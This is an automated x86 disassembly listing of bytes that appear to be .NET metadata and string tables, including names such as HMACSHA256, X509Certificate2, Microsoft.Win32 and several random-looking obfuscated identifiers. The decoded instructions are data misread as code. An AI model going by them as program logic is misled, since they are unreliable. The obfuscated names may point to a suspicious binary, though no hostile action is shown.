  406f79:	25 99 07 99 00       	and    $0x990799,%eax
  406f7e:	34 1d                	xor    $0x1d,%al
  406f80:	a3 07 e9 03 0c       	mov    %eax,0xc03e907
  406f85:	10 0e                	adc    %cl,(%esi)
  406f87:	00 f1                	add    %dh,%cl
  406f89:	03 34 1d 49 04 f9 03 	add    0x3f90449(,%ebx,1),%esi
  406f90:	94                   	xchg   %eax,%esp
  406f91:	13 ab 07 81 00 ac    	adc    -0x53ff7ef9(%ebx),%ebp
  406f97:	0d 0a 00 09 03       	or     $0x309000a,%eax
  406f9c:	0a 25 87 06 09 03    	or     0x3090687,%ah
  406fa2:	35 12 b9 07 91       	xor    $0x9107b912,%eax
  406fa7:	01 03                	add    %eax,(%ebx)
  406fa9:	0e                   	push   %cs
  406faa:	95                   	xchg   %eax,%ebp
  406fab:	01 09                	add    %ecx,(%ecx)
  406fad:	03 0a                	add    (%edx),%ecx
  406faf:	25 c9 07 09 03       	and    $0x30907c9,%eax
  406fb4:	2c 12                	sub    $0x12,%al
  406fb6:	ce                   	into
  406fb7:	06                   	push   %es
  406fb8:	09 03                	or     %eax,(%ebx)
  406fba:	20 12                	and    %dl,(%edx)
  406fbc:	53                   	push   %ebx
  406fbd:	01 09                	add    %ecx,(%ecx)
  406fbf:	03 17                	add    (%edi),%edx
  406fc1:	25 d0 07 09 03       	and    $0x30907d0,%eax
  406fc6:	f2 0d 53 01 99 03    	repnz or $0x3990153,%eax
  406fcc:	80 22 eb             	andb   $0xeb,(%edx)
  406fcf:	07                   	pop    %es
  406fd0:	0c 00                	or     $0x0,%al
  406fd2:	5a                   	pop    %edx
  406fd3:	12 01                	adc    (%ecx),%al
  406fd5:	08 09                	or     %cl,(%ecx)
  406fd7:	04 9d                	add    $0x9d,%al
  406fd9:	18 0b                	sbb    %cl,(%ebx)
  406fdb:	08 09                	or     %cl,(%ecx)
  406fdd:	04 f1                	add    $0xf1,%al
  406fdf:	0b 11                	or     (%ecx),%edx
  406fe1:	08 11                	or     %dl,(%ecx)
  406fe3:	04 e3                	add    $0xe3,%al
  406fe5:	0f 19 08             	nopl   (%eax)
  406fe8:	21 04 7f             	and    %eax,(%edi,%edi,2)
  406feb:	0d 20 08 19 04       	or     $0x4190820,%eax
  406ff0:	77 0e                	ja     0x407000
  406ff2:	27                   	daa
  406ff3:	08 31                	or     %dh,(%ecx)
  406ff5:	04 3b                	add    $0x3b,%al
  406ff7:	10 30                	adc    %dh,(%eax)
  406ff9:	08 41 04             	or     %al,0x4(%ecx)
  406ffc:	90                   	nop
  406ffd:	1b 3a                	sbb    (%edx),%edi
  406fff:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407002:	3b 10                	cmp    (%eax),%edx
  407004:	6f                   	outsl  %ds:(%esi),(%dx)
  407005:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407008:	c2 20 7b             	ret    $0x7b20
  40700b:	08 34 00             	or     %dh,(%eax,%eax,1)
  40700e:	0f 0e                	femms
  407010:	93                   	xchg   %eax,%ebx
  407011:	08 c9                	or     %cl,%cl
  407013:	01 eb                	add    %ebp,%ebx
  407015:	25 84 00 61 04       	and    $0x4610084,%eax
  40701a:	34 1d                	xor    $0x1d,%al
  40701c:	53                   	push   %ebx
  40701d:	01 59 04             	add    %ebx,0x4(%ecx)
  407020:	34 1d                	xor    $0x1d,%al
  407022:	b1 08                	mov    $0x8,%cl
  407024:	69 04 f1 1e b9 08 51 	imul   $0x5108b91e,(%ecx,%esi,8),%eax
  40702b:	01 f5                	add    %esi,%ebp
  40702d:	13 cd                	adc    %ebp,%ecx
  40702f:	00 89 04 34 1d 53    	add    %cl,0x531d3404(%ecx)
  407035:	01 71 04             	add    %esi,0x4(%ecx)
  407038:	34 1d                	xor    $0x1d,%al
  40703a:	0e                   	push   %cs
  40703b:	00 91 04 d1 12 fa    	add    %dl,-0x5ed2efc(%ecx)
  407041:	02 91 04 6e 12 fa    	add    -0x5ed91fc(%ecx),%dl
  407047:	02 91 04 8e 0d d2    	add    -0x2df271fc(%ecx),%dl
  40704d:	08 91 04 88 13 d9    	or     %dl,-0x26ec77fc(%ecx)
  407053:	08 91 04 02 25 79    	or     %dl,0x79250204(%ecx)
  407059:	01 91 04 5c 08 0e    	add    %edx,0xe085c04(%ecx)
  40705f:	00 91 04 59 1d e0    	add    %dl,-0x1fe2a6fc(%ecx)
  407065:	08 79 04             	or     %bh,0x4(%ecx)
  407068:	34 1d                	xor    $0x1d,%al
  40706a:	e6 08                	out    %al,$0x8
  40706c:	91                   	xchg   %eax,%ecx
  40706d:	04 4e                	add    $0x4e,%al
  40706f:	08 7f 01             	or     %bh,0x1(%edi)
  407072:	79 04                	jns    0x407078
  407074:	d1 15 0e 00 81 04    	rcll   $1,0x481000e
  40707a:	34 1d                	xor    $0x1d,%al
  40707c:	79 01                	jns    0x40707f
  40707e:	59                   	pop    %ecx
  40707f:	02 e6                	add    %dh,%ah
  407081:	24 7f                	and    $0x7f,%al
  407083:	01 b9 03 9c 14 f2    	add    %edi,-0xdeb63fd(%ecx)
  407089:	08 b9 04 34 1d 53    	or     %bh,0x531d3404(%ecx)
  40708f:	01 91 04 55 08 79    	add    %edx,0x79085504(%ecx)
  407095:	01 91 04 49 1d e0    	add    %edx,-0x1fe2b6fc(%ecx)
  40709b:	08 c1                	or     %al,%cl
  40709d:	04 7d                	add    $0x7d,%al
  40709f:	25 16 09 c9 04       	and    $0x4c90916,%eax
  4070a4:	34 1d                	xor    $0x1d,%al
  4070a6:	0e                   	push   %cs
  4070a7:	00 d1                	add    %dl,%cl
  4070a9:	04 34                	add    $0x34,%al
  4070ab:	1d 4f 09 08 00       	sbb    $0x8094f,%eax
  4070b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4070b1:	00 cd                	add    %cl,%ch
  4070b3:	01 08                	add    %ecx,(%eax)
  4070b5:	00 a8 00 d2 01 08    	add    %ch,0x801d200(%eax)
  4070bb:	00 ac 00 d7 01 08 00 	add    %ch,0x801d7(%eax,%eax,1)
  4070c2:	b0 00                	mov    $0x0,%al
  4070c4:	dc 01                	faddl  (%ecx)
  4070c6:	08 00                	or     %al,(%eax)
  4070c8:	b4 00                	mov    $0x0,%ah
  4070ca:	e1 01                	loope  0x4070cd
  4070cc:	08 00                	or     %al,(%eax)
  4070ce:	b8 00 e6 01 08       	mov    $0x801e600,%eax
  4070d3:	00 bc 00 eb 01 08 00 	add    %bh,0x801eb(%eax,%eax,1)
  4070da:	c0 00 f0             	rolb   $0xf0,(%eax)
  4070dd:	01 08                	add    %ecx,(%eax)
  4070df:	00 c4                	add    %al,%ah
  4070e1:	00 f5                	add    %dh,%ch
  4070e3:	01 08                	add    %ecx,(%eax)
  4070e5:	00 c8                	add    %cl,%al
  4070e7:	00 fa                	add    %bh,%dl
  4070e9:	01 08                	add    %ecx,(%eax)
  4070eb:	00 cc                	add    %cl,%ah
  4070ed:	00 ff                	add    %bh,%bh
  4070ef:	01 08                	add    %ecx,(%eax)
  4070f1:	00 d0                	add    %dl,%al
  4070f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4070f6:	09 00                	or     %eax,(%eax)
  4070f8:	d8 00                	fadds  (%eax)
  4070fa:	8e 02                	mov    (%edx),%es
  4070fc:	09 00                	or     %eax,(%eax)
  4070fe:	dc 00                	faddl  (%eax)
  407100:	d7                   	xlat   %ds:(%ebx)
  407101:	01 09                	add    %ecx,(%ecx)
  407103:	00 e0                	add    %ah,%al
  407105:	00 d2                	add    %dl,%dl
  407107:	01 08                	add    %ecx,(%eax)
  407109:	00 f4                	add    %dh,%ah
  40710b:	00 cf                	add    %cl,%bh
  40710d:	02 08                	add    (%eax),%cl
  40710f:	00 f8                	add    %bh,%al
  407111:	00 d4                	add    %dl,%ah
  407113:	02 08                	add    (%eax),%cl
  407115:	00 fc                	add    %bh,%ah
  407117:	00 d9                	add    %bl,%cl
  407119:	02 08                	add    (%eax),%cl
  40711b:	00 00                	add    %al,(%eax)
  40711d:	01 cf                	add    %ecx,%edi
  40711f:	02 2e                	add    (%esi),%ch
  407121:	00 2b                	add    %ch,(%ebx)
  407123:	00 ff                	add    %bh,%bh
  407125:	02 2e                	add    (%esi),%ch
  407127:	00 33                	add    %dh,(%ebx)
  407129:	00 08                	add    %cl,(%eax)
  40712b:	03 2e                	add    (%esi),%ebp
  40712d:	00 3b                	add    %bh,(%ebx)
  40712f:	00 2d 03 2e 00 43    	add    %ch,0x43002e03
  407135:	00 36                	add    %dh,(%esi)
  407137:	03 2e                	add    (%esi),%ebp
  407139:	00 4b 00             	add    %cl,0x0(%ebx)
  40713c:	36 03 2e             	add    %ss:(%esi),%ebp
  40713f:	00 53 00             	add    %dl,0x0(%ebx)
  407142:	36 03 2e             	add    %ss:(%esi),%ebp
  407145:	00 5b 00             	add    %bl,0x0(%ebx)
  407148:	36 03 2e             	add    %ss:(%esi),%ebp
  40714b:	00 63 00             	add    %ah,0x0(%ebx)
  40714e:	36 03 2e             	add    %ss:(%esi),%ebp
  407151:	00 6b 00             	add    %ch,0x0(%ebx)
  407154:	36 03 2e             	add    %ss:(%esi),%ebp
  407157:	00 73 00             	add    %dh,0x0(%ebx)
  40715a:	36 03 2e             	add    %ss:(%esi),%ebp
  40715d:	00 7b 00             	add    %bh,0x0(%ebx)
  407160:	36 03 2e             	add    %ss:(%esi),%ebp
  407163:	00 83 00 3c 03 2e    	add    %al,0x2e033c00(%ebx)
  407169:	00 8b 00 49 03 c0    	add    %cl,-0x3ffcb700(%ebx)
  40716f:	00 93 00 d2 01 e0    	add    %dl,-0x1ffe2e00(%ebx)
  407175:	00 93 00 d2 01 e3    	add    %dl,-0x1cfe2e00(%ebx)
  40717b:	00 9b 00 af 03 00    	add    %bl,0x3af00(%ebx)
  407181:	01 93 00 d2 01 20    	add    %edx,0x2001d200(%ebx)
  407187:	01 93 00 d2 01 40    	add    %edx,0x4001d200(%ebx)
  40718d:	01 93 00 d2 01 60    	add    %edx,0x6001d200(%ebx)
  407193:	01 93 00 d2 01 80    	add    %edx,-0x7ffe2e00(%ebx)
  407199:	01 93 00 d2 01 a0    	add    %edx,-0x5ffe2e00(%ebx)
  40719f:	01 93 00 d2 01 c0    	add    %edx,-0x3ffe2e00(%ebx)
  4071a5:	01 93 00 d2 01 e0    	add    %edx,-0x1ffe2e00(%ebx)
  4071ab:	01 93 00 d2 01 00    	add    %edx,0x1d200(%ebx)
  4071b1:	02 93 00 d2 01 20    	add    0x2001d200(%ebx),%dl
  4071b7:	02 93 00 d2 01 40    	add    0x4001d200(%ebx),%dl
  4071bd:	02 93 00 d2 01 41    	add    0x4101d200(%ebx),%dl
  4071c3:	02 93 00 d2 01 60    	add    0x6001d200(%ebx),%dl
  4071c9:	02 93 00 d2 01 61    	add    0x6101d200(%ebx),%dl
  4071cf:	02 93 00 d2 01 80    	add    -0x7ffe2e00(%ebx),%dl
  4071d5:	02 93 00 d2 01 81    	add    -0x7efe2e00(%ebx),%dl
  4071db:	02 93 00 d2 01 a0    	add    -0x5ffe2e00(%ebx),%dl
  4071e1:	02 93 00 d2 01 a1    	add    -0x5efe2e00(%ebx),%dl
  4071e7:	02 93 00 d2 01 c0    	add    -0x3ffe2e00(%ebx),%dl
  4071ed:	02 93 00 d2 01 c1    	add    -0x3efe2e00(%ebx),%dl
  4071f3:	02 93 00 d2 01 e0    	add    -0x1ffe2e00(%ebx),%dl
  4071f9:	02 93 00 d2 01 e1    	add    -0x1efe2e00(%ebx),%dl
  4071ff:	02 93 00 d2 01 e3    	add    -0x1cfe2e00(%ebx),%dl
  407205:	02 93 00 d2 01 00    	add    0x1d200(%ebx),%dl
  40720b:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  407211:	03 93 00 d2 01 21    	add    0x2101d200(%ebx),%edx
  407217:	03 93 00 d2 01 41    	add    0x4101d200(%ebx),%edx
  40721d:	03 93 00 d2 01 61    	add    0x6101d200(%ebx),%edx
  407223:	03 93 00 d2 01 63    	add    0x6301d200(%ebx),%edx
  407229:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  40722f:	00 06                	add    %al,(%esi)
  407231:	00 00                	add    %al,(%eax)
  407233:	00 1c 00             	add    %bl,(%eax,%eax,1)
  407236:	01 00                	add    %eax,(%eax)
  407238:	20 00                	and    %al,(%eax)
  40723a:	00 00                	add    %al,(%eax)
  40723c:	1d 00 b9 03 c8       	sbb    $0xc803b900,%eax
  407241:	03 f3                	add    %ebx,%esi
  407243:	03 8f 04 b5 04 df    	add    -0x20fb4afc(%edi),%ecx
  407249:	04 f6                	add    $0xf6,%al
  40724b:	04 0a                	add    $0xa,%al
  40724d:	05 15 05 3b 05       	add    $0x53b0515,%eax
  407252:	48                   	dec    %eax
  407253:	05 8d 05 9e 05       	add    $0x59e058d,%eax
  407258:	bc 05 d2 05 d8       	mov    $0xd805d205,%esp
  40725d:	05 0f 06 19 06       	add    $0x619060f,%eax
  407262:	1f                   	pop    %ds
  407263:	06                   	push   %es
  407264:	24 06                	and    $0x6,%al
  407266:	2a 06                	sub    (%esi),%al
  407268:	33 06                	xor    (%esi),%eax
  40726a:	40                   	inc    %eax
  40726b:	06                   	push   %es
  40726c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40726d:	06                   	push   %es
  40726e:	ab                   	stos   %eax,%es:(%edi)
  40726f:	06                   	push   %es
  407270:	d3 06                	roll   %cl,(%esi)
  407272:	dc 06                	faddl  (%esi)
  407274:	e1 06                	loope  0x40727c
  407276:	eb 06                	jmp    0x40727e
  407278:	16                   	push   %ss
  407279:	07                   	pop    %es
  40727a:	26 07                	es pop %es
  40727c:	38 07                	cmp    %al,(%edi)
  40727e:	5f                   	pop    %edi
  40727f:	07                   	pop    %es
  407280:	84 07                	test   %al,(%edi)
  407282:	b2 07                	mov    $0x7,%dl
  407284:	c2 07 d8             	ret    $0xd807
  407287:	07                   	pop    %es
  407288:	07                   	pop    %es
  407289:	08 ab 08 bf 08 fb    	or     %ch,-0x4f740f8(%ebx)
  40728f:	08 23                	or     %ah,(%ebx)
  407291:	09 28                	or     %ebp,(%eax)
  407293:	09 37                	or     %esi,(%edi)
  407295:	09 3f                	or     %edi,(%edi)
  407297:	09 58 09             	or     %ebx,0x9(%eax)
  40729a:	04 00                	add    $0x0,%al
  40729c:	01 00                	add    %eax,(%eax)
  40729e:	06                   	push   %es
  40729f:	00 0b                	add    %cl,(%ebx)
  4072a1:	00 07                	add    %al,(%edi)
  4072a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4072a6:	08 00                	or     %al,(%eax)
  4072a8:	0e                   	push   %cs
  4072a9:	00 00                	add    %al,(%eax)
  4072ab:	00 f5                	add    %dh,%ch
  4072ad:	23 9f 00 00 00 bb    	and    -0x45000000(%edi),%ebx
  4072b3:	07                   	pop    %es
  4072b4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4072b5:	00 00                	add    %al,(%eax)
  4072b7:	00 b0 1d a9 00 00    	add    %dh,0xa91d(%eax)
  4072bd:	00 0f                	add    %cl,(%edi)
  4072bf:	15 ae 00 00 00       	adc    $0xae,%eax
  4072c4:	d1 1a                	rcrl   $1,(%edx)
  4072c6:	ae                   	scas   %es:(%edi),%al
  4072c7:	00 00                	add    %al,(%eax)
  4072c9:	00 36                	add    %dh,(%esi)
  4072cb:	23 b2 00 00 00 b7    	and    -0x49000000(%edx),%esi
  4072d1:	1a b7 00 00 00 52    	sbb    0x52000000(%edi),%dh
  4072d7:	20 bb 00 00 00 76    	and    %bh,0x76000000(%ebx)
  4072dd:	08 b2 00 00 00 a4    	or     %dh,-0x5c000000(%edx)
  4072e3:	08 bf 00 00 00 ae    	or     %bh,-0x52000000(%edi)
  4072e9:	23 0c 01             	and    (%ecx,%eax,1),%ecx
  4072ec:	00 00                	add    %al,(%eax)
  4072ee:	35 15 41 01 00       	xor    $0x14115,%eax
  4072f3:	00 d4                	add    %dl,%ah
  4072f5:	22 47 01             	and    0x1(%edi),%al
  4072f8:	00 00                	add    %al,(%eax)
  4072fa:	cd 0b                	int    $0xb
  4072fc:	b7 01                	mov    $0x1,%bh
  4072fe:	00 00                	add    %al,(%eax)
  407300:	be 0a bb 01 00       	mov    $0x1bb0a,%esi
  407305:	00 b9 14 bf 01 00    	add    %bh,0x1bf14(%ecx)
  40730b:	00 61 23             	add    %ah,0x23(%ecx)
  40730e:	c3                   	ret
  40730f:	01 00                	add    %eax,(%eax)
  407311:	00 81 0a c8 01 02    	add    %al,0x201c80a(%ecx)
  407317:	00 06                	add    %al,(%esi)
  407319:	00 03                	add    %al,(%ebx)
  40731b:	00 01                	add    %al,(%ecx)
  40731d:	00 07                	add    %al,(%edi)
  40731f:	00 03                	add    %al,(%ebx)
  407321:	00 02                	add    %al,(%edx)
  407323:	00 08                	add    %cl,(%eax)
  407325:	00 05 00 01 00 09    	add    %al,0x9000100
  40732b:	00 05 00 02 00 0a    	add    %al,0xa000200
  407331:	00 07                	add    %al,(%edi)
  407333:	00 01                	add    %al,(%ecx)
  407335:	00 0b                	add    %cl,(%ebx)
  407337:	00 07                	add    %al,(%edi)
  407339:	00 02                	add    %al,(%edx)
  40733b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40733e:	09 00                	or     %eax,(%eax)
  407340:	01 00                	add    %eax,(%eax)
  407342:	0d 00 09 00 02       	or     $0x2000900,%eax
  407347:	00 0e                	add    %cl,(%esi)
  407349:	00 0b                	add    %cl,(%ebx)
  40734b:	00 01                	add    %al,(%ecx)
  40734d:	00 0f                	add    %cl,(%edi)
  40734f:	00 0b                	add    %cl,(%ebx)
  407351:	00 02                	add    %al,(%edx)
  407353:	00 10                	add    %dl,(%eax)
  407355:	00 0d 00 01 00 11    	add    %cl,0x11000100
  40735b:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407361:	00 0f                	add    %cl,(%edi)
  407363:	00 01                	add    %al,(%ecx)
  407365:	00 13                	add    %dl,(%ebx)
  407367:	00 0f                	add    %cl,(%edi)
  407369:	00 02                	add    %al,(%edx)
  40736b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40736e:	11 00                	adc    %eax,(%eax)
  407370:	02 00                	add    (%eax),%al
  407372:	15 00 13 00 01       	adc    $0x1001300,%eax
  407377:	00 16                	add    %dl,(%esi)
  407379:	00 13                	add    %dl,(%ebx)
  40737b:	00 02                	add    %al,(%edx)
  40737d:	00 17                	add    %dl,(%edi)
  40737f:	00 15 00 01 00 18    	add    %dl,0x18000100
  407385:	00 15 00 02 00 2e    	add    %dl,0x2e000200
  40738b:	00 17                	add    %dl,(%edi)
  40738d:	00 02                	add    %al,(%edx)
  40738f:	00 36                	add    %dh,(%esi)
  407391:	00 19                	add    %bl,(%ecx)
  407393:	00 02                	add    %al,(%edx)
  407395:	00 37                	add    %dh,(%edi)
  407397:	00 1b                	add    %bl,(%ebx)
  407399:	00 02                	add    %al,(%edx)
  40739b:	00 59 00             	add    %bl,0x0(%ecx)
  40739e:	1d 00 01 00 5a       	sbb    $0x5a000100,%eax
  4073a3:	00 1d 00 02 00 5b    	add    %bl,0x5b000200
  4073a9:	00 1f                	add    %bl,(%edi)
  4073ab:	00 01                	add    %al,(%ecx)
  4073ad:	00 5c 00 1f          	add    %bl,0x1f(%eax,%eax,1)
  4073b1:	00 02                	add    %al,(%edx)
  4073b3:	00 5d 00             	add    %bl,0x0(%ebp)
  4073b6:	21 00                	and    %eax,(%eax)
  4073b8:	01 00                	add    %eax,(%eax)
  4073ba:	5e                   	pop    %esi
  4073bb:	00 21                	add    %ah,(%ecx)
  4073bd:	00 02                	add    %al,(%edx)
  4073bf:	00 5f 00             	add    %bl,0x0(%edi)
  4073c2:	23 00                	and    (%eax),%eax
  4073c4:	02 00                	add    (%eax),%al
  4073c6:	60                   	pusha
  4073c7:	00 25 00 06 00 5c    	add    %ah,0x5c000600
  4073cd:	00 03                	add    %al,(%ebx)
  4073cf:	00 06                	add    %al,(%esi)
  4073d1:	00 5e 00             	add    %bl,0x0(%esi)
  4073d4:	05 00 06 00 60       	add    $0x60000600,%eax
  4073d9:	00 07                	add    %al,(%edi)
  4073db:	00 08                	add    %cl,(%eax)
  4073dd:	00 c2                	add    %al,%dl
  4073df:	00 09                	add    %cl,(%ecx)
  4073e1:	00 a8 16 b5 16 fd    	add    %ch,-0x2e94aea(%eax)
  4073e7:	04 2e                	add    $0x2e,%al
  4073e9:	05 9b 05 71 07       	add    $0x771059b,%eax
  4073ee:	57                   	push   %edi
  4073ef:	08 7f 08             	or     %bh,0x8(%edi)
  4073f2:	00 01                	add    %al,(%ecx)
  4073f4:	f1                   	int1
  4073f5:	00 55 0e             	add    %dl,0xe(%ebp)
  4073f8:	01 00                	add    %eax,(%eax)
  4073fa:	41                   	inc    %ecx
  4073fb:	01 f3                	add    %esi,%ebx
  4073fd:	00 ef                	add    %ch,%bh
  4073ff:	21 01                	and    %eax,(%ecx)
  407401:	00 40 01             	add    %al,0x1(%eax)
  407404:	0b 01                	or     (%ecx),%eax
  407406:	42                   	inc    %edx
  407407:	10 01                	adc    %al,(%ecx)
  407409:	00 40 01             	add    %al,0x1(%eax)
  40740c:	19 01                	sbb    %eax,(%ecx)
  40740e:	39 16                	cmp    %edx,(%esi)
  407410:	02 00                	add    (%eax),%al
  407412:	50                   	push   %eax
  407413:	20 00                	and    %al,(%eax)
  407415:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  407419:	20 00                	and    %al,(%eax)
  40741b:	00 45 00             	add    %al,0x0(%ebp)
  40741e:	04 80                	add    $0x80,%al
  407420:	00 00                	add    %al,(%eax)
  407422:	01 00                	add    %eax,(%eax)
	...
  407430:	dc 0a                	fmull  (%edx)
  407432:	00 00                	add    %al,(%eax)
  407434:	04 00                	add    $0x0,%al
	...
  40743e:	00 00                	add    %al,(%eax)
  407440:	01 00                	add    %eax,(%eax)
  407442:	b5 0a                	mov    $0xa,%ch
  407444:	00 00                	add    %al,(%eax)
  407446:	00 00                	add    %al,(%eax)
  407448:	04 00                	add    $0x0,%al
	...
  407452:	00 00                	add    %al,(%eax)
  407454:	01 00                	add    %eax,(%eax)
  407456:	83 17 00             	adcl   $0x0,(%edi)
  407459:	00 00                	add    %al,(%eax)
  40745b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407466:	00 00                	add    %al,(%eax)
  407468:	70 02                	jo     0x40746c
  40746a:	4a                   	dec    %edx
  40746b:	14 00                	adc    $0x0,%al
  40746d:	00 00                	add    %al,(%eax)
  40746f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40747a:	00 00                	add    %al,(%eax)
  40747c:	01 00                	add    %eax,(%eax)
  40747e:	00 10                	add    %dl,(%eax)
  407480:	00 00                	add    %al,(%eax)
  407482:	00 00                	add    %al,(%eax)
  407484:	0a 00                	or     (%eax),%al
	...
  40748e:	00 00                	add    %al,(%eax)
  407490:	70 02                	jo     0x407494
  407492:	50                   	push   %eax
  407493:	0b 00                	or     (%eax),%eax
  407495:	00 00                	add    %al,(%eax)
  407497:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4074a2:	00 00                	add    %al,(%eax)
  4074a4:	70 02                	jo     0x4074a8
  4074a6:	9b                   	fwait
  4074a7:	21 00                	and    %eax,(%eax)
  4074a9:	00 00                	add    %al,(%eax)
  4074ab:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4074b6:	00 00                	add    %al,(%eax)
  4074b8:	01 00                	add    %eax,(%eax)
  4074ba:	7e 1f                	jle    0x4074db
  4074bc:	00 00                	add    %al,(%eax)
  4074be:	00 00                	add    %al,(%eax)
  4074c0:	04 00                	add    $0x0,%al
	...
  4074ca:	00 00                	add    %al,(%eax)
  4074cc:	70 02                	jo     0x4074d0
  4074ce:	1c 1b                	sbb    $0x1b,%al
  4074d0:	00 00                	add    %al,(%eax)
  4074d2:	00 00                	add    %al,(%eax)
  4074d4:	12 00                	adc    (%eax),%al
  4074d6:	11 00                	adc    %eax,(%eax)
  4074d8:	17                   	pop    %ss
  4074d9:	00 16                	add    %dl,(%esi)
  4074db:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4074de:	1b 00                	sbb    (%eax),%eax
  4074e0:	1d 00 1b 00 79       	sbb    $0x79001b00,%eax
  4074e5:	01 03                	add    %eax,(%ebx)
  4074e7:	07                   	pop    %es
  4074e8:	7b 01                	jnp    0x4074eb
  4074ea:	03 07                	add    (%edi),%eax
  4074ec:	d7                   	xlat   %ds:(%ebx)
  4074ed:	01 fc                	add    %edi,%esp
  4074ef:	07                   	pop    %es
  4074f0:	00 41 63             	add    %al,0x63(%ecx)
  4074f3:	74 69                	je     0x40755e
  4074f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f7:	60                   	pusha
  4074f8:	31 30                	xor    %esi,(%eax)
  4074fa:	00 49 45             	add    %cl,0x45(%ecx)
  4074fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4074fe:	75 6d                	jne    0x40756d
  407500:	65 72 61             	gs jb  0x407564
  407503:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407507:	31 00                	xor    %eax,(%eax)
  407509:	43                   	inc    %ebx
  40750a:	61                   	popa
  40750b:	6c                   	insb   (%dx),%es:(%edi)
  40750c:	6c                   	insb   (%dx),%es:(%edi)
  40750d:	53                   	push   %ebx
  40750e:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407515:	69 
  407516:	73 74                	jae    0x40758c
  407518:	60                   	pusha
  407519:	31 00                	xor    %eax,(%eax)
  40751b:	4d                   	dec    %ebp
  40751c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407523:	74 2e                	je     0x407553
  407525:	57                   	push   %edi
  407526:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40752d:	55                   	push   %ebp
  40752e:	49                   	dec    %ecx
  40752f:	6e                   	outsb  %ds:(%esi),(%dx)
  407530:	74 33                	je     0x407565
  407532:	32 00                	xor    (%eax),%al
  407534:	54                   	push   %esp
  407535:	6f                   	outsl  %ds:(%esi),(%dx)
  407536:	49                   	dec    %ecx
  407537:	6e                   	outsb  %ds:(%esi),(%dx)
  407538:	74 33                	je     0x40756d
  40753a:	32 00                	xor    (%eax),%al
  40753c:	58                   	pop    %eax
  40753d:	35 30 39 43 65       	xor    $0x65433930,%eax
  407542:	72 74                	jb     0x4075b8
  407544:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40754b:	32 00                	xor    (%eax),%al
  40754d:	54                   	push   %esp
  40754e:	6f                   	outsl  %ds:(%esi),(%dx)
  40754f:	55                   	push   %ebp
  407550:	49                   	dec    %ecx
  407551:	6e                   	outsb  %ds:(%esi),(%dx)
  407552:	74 36                	je     0x40758a
  407554:	34 00                	xor    $0x0,%al
  407556:	54                   	push   %esp
  407557:	6f                   	outsl  %ds:(%esi),(%dx)
  407558:	49                   	dec    %ecx
  407559:	6e                   	outsb  %ds:(%esi),(%dx)
  40755a:	74 36                	je     0x407592
  40755c:	34 00                	xor    $0x0,%al
  40755e:	54                   	push   %esp
  40755f:	6f                   	outsl  %ds:(%esi),(%dx)
  407560:	55                   	push   %ebp
  407561:	49                   	dec    %ecx
  407562:	6e                   	outsb  %ds:(%esi),(%dx)
  407563:	74 31                	je     0x407596
  407565:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40756a:	6e                   	outsb  %ds:(%esi),(%dx)
  40756b:	74 31                	je     0x40759e
  40756d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407571:	41                   	inc    %ecx
  407572:	43                   	inc    %ebx
  407573:	53                   	push   %ebx
  407574:	48                   	dec    %eax
  407575:	41                   	inc    %ecx
  407576:	32 35 36 00 67 65    	xor    0x65670036,%dh
  40757c:	74 5f                	je     0x4075dd
  40757e:	55                   	push   %ebp
  40757f:	54                   	push   %esp
  407580:	46                   	inc    %esi
  407581:	38 00                	cmp    %al,(%eax)
  407583:	3c 4d                	cmp    $0x4d,%al
  407585:	6f                   	outsl  %ds:(%esi),(%dx)
  407586:	64 75 6c             	fs jne 0x4075f5
  407589:	65 3e 00 4d 67       	gs add %cl,%ds:0x67(%ebp)
  40758e:	50                   	push   %eax
  40758f:	41                   	inc    %ecx
  407590:	42                   	inc    %edx
  407591:	55                   	push   %ebp
  407592:	43                   	inc    %ebx
  407593:	69 51 45 45 41 00 6b 	imul   $0x6b004145,0x45(%ecx),%edx
  40759a:	4a                   	dec    %edx
  40759b:	4f                   	dec    %edi
  40759c:	53                   	push   %ebx
  40759d:	52                   	push   %edx
  40759e:	44                   	inc    %esp
  40759f:	71 6e                	jno    0x40760f
  4075a1:	75 78                	jne    0x40761b
  4075a3:	73 47                	jae    0x4075ec
  4075a5:	41                   	inc    %ecx
  4075a6:	00 66 63             	add    %ah,0x63(%esi)
  4075a9:	77 57                	ja     0x407602
  4075ab:	79 61                	jns    0x40760e
  4075ad:	50                   	push   %eax
  4075ae:	4e                   	dec    %esi
  4075af:	6b 75 54 4c          	imul   $0x4c,0x54(%ebp),%esi
  4075b3:	41                   	inc    %ecx
  4075b4:	00 79 73             	add    %bh,0x73(%ecx)
  4075b7:	6d                   	insl   (%dx),%es:(%edi)
  4075b8:	59                   	pop    %ecx
  4075b9:	4d                   	dec    %ebp
  4075ba:	4f                   	dec    %edi
  4075bb:	59                   	pop    %ecx
  4075bc:	77 57                	ja     0x407615
  4075be:	50                   	push   %eax
  4075bf:	53                   	push   %ebx
  4075c0:	41                   	inc    %ecx
  4075c1:	00 75 48             	add    %dh,0x48(%ebp)
